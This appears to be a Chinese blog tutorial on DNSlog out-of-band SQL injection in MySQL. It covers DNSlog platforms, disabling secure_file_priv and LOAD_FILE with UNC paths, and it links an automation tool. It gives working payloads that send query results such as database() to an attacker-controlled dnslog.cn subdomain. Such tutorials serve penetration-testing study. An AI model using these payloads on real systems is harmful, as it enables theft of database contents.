# 原创
：  【SQL注入-有回显】DNS请求注入：原理、平台、使用过程、配置

# 【SQL注入-有回显】DNS请求注入：原理、平台、使用过程、配置

**目录**

[一、DNS请求注入](#DNSlog%E6%B3%A8%E5%85%A5)

[1.1、DNSlog平台：](#DNSlog%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、DNSlog注入原理](#DNSlog%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86)

[二、前提条件：](#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6%EF%BC%9A)

[2.1、简介：](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[2.2、查看配置：](#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%EF%BC%9A)

[2.3、配置设置：](#%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%EF%BC%9A)

[2.4、相关函数：](#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%EF%BC%9A)

[2.5、UNC路径](#UNC%E8%B7%AF%E5%BE%84)

[三、DNSlog注入过程：](#%E4%B8%89%E3%80%81DNSlog%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%EF%BC%9A)

[3.1、第一步：Get SubDomain  获得域名](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9AGet%20SubDomain%C2%A0%20%E8%8E%B7%E5%BE%97%E5%9F%9F%E5%90%8D)

[3.2、第二步：构造注入语句](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5)

[3.3、第三步：查看域名头部，带出了查询的信息](#3.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%90%8D%E5%A4%B4%E9%83%A8%EF%BC%8C%E5%B8%A6%E5%87%BA%E4%BA%86%E6%9F%A5%E8%AF%A2%E7%9A%84%E4%BF%A1%E6%81%AF)

[四、DNSlongsqlinj工具](#DNSlongsqlinj%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8)

---


## 一、DNS请求注入

> 
<h3>1.1、DNSlog平台：</h3>
[http://www.dnslog.cn](http://www.dnslog.cn/)
[http://ceye.io](http://ceye.io/)
[http://admin.dnslog.link](https://www.freebuf.com/column/184587.html)


> 
<h3>1.2、DNSlog注入原理</h3>
dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据
<hr/>
在无法通过联合查询直接获取数据时，只能通过盲注，来一步步的获取数据，手工测试是需要花费大量的时间，使用sqlmap直接去跑出数据，但是有很大的几率，网站把ip给封掉，这就影响了测试进度


---


---


## 二、前提条件：

> 
<h3>2.1、简介：</h3>
dns带外查询属于MySQL注入
在MySQL中有个系统属性，secure_file_priv特性，有三种状态
secure_file_priv为null    表示不允许导入导出
secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹
secure_file_priv没有设置时，则表示没有任何限制


> 
<h3>2.2、查看配置：</h3>
[手动打开数据库，新版phpstudy启动MySQL命令符图解过程<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/123047469?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165521166116782395352907%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165521166116782395352907&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-123047469-null-null.nonecase&amp;utm_term=%E6%89%8B%E5%8A%A8%E6%89%93%E5%BC%80%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/123047469?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165521166116782395352907%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165521166116782395352907&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-123047469-null-null.nonecase&amp;utm_term=%E6%89%8B%E5%8A%A8%E6%89%93%E5%BC%80%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1018.2226.3001.4450)
是否配置好，打开数据库

 因为我的secure_file_priv设置过，所以没有任何限制


> 
<h3>2.3、配置设置：</h3>
打开MySQL文件夹，打开my.ini配置文件


把这里改为空，如果没有这一段代码，则手动加上去<img alt="" height="647" src="https://img-blog.csdnimg.cn/94f88cc7a2d645f6845040f51a3ccbf8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6buR6Imy5Zyw5bimKOW0m-i1tyk=,size_20,color_FFFFFF,t_70,g_se,x_16" width="872"/>
然后重启数据库 


> 
<h3>2.4、相关函数：</h3>
LOAD_FILE()函数
读取一个文件并将其内容作为字符串返回
语法：load_file(文件的完整路径）
此函数使用需要满足的条件
文件必须位于服务器主机上，具有该FILE权限才能读取该文件，拥有该FILE权限的用户可以读取服务器主机上的任何文件，该文件是world-readable的或MySQL服务器可读的，此属性与secure_file_priv状态相关，并且它的大小小于max_allowed_packet字节


> 
<h3>2.5、UNC路径</h3>
格式为
\\servername\sharename\……
 servername 是服务器名，sharename 是共享资源的名称


---


---


## 三、DNSlog注入过程：

> 
<h3>3.1、第一步：Get SubDomain  获得域名</h3>




> 
<h3>3.2、第二步：构造注入语句</h3>
（根据实际情况构造）
  select load_file(concat('//',(select database()),'.casro0.dnslog.cn/abc'))
  select load_file(concat('\\\\',(select database()),'.casro0.dnslog.cn\\123'))
load_file()函数访问的是文件，所以域名后面需要添加/abc
<hr/>
成功注入后，在数据库中运行





> 
<h3>3.3、第三步：查看域名头部，带出了查询的信息</h3>

注意：外带信息有特殊字符，如@
可以将查询语句后的结果进行转码
即上面的(select database())--------&gt;hex(select database())等形式


> 
<h2>四、DNSlongsqlinj工具</h2>
[ADOOO/DnslogSqlinj (github.com)<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://github.com/ADOOO/DnslogSqlinj](https://github.com/ADOOO/DnslogSqlinj)


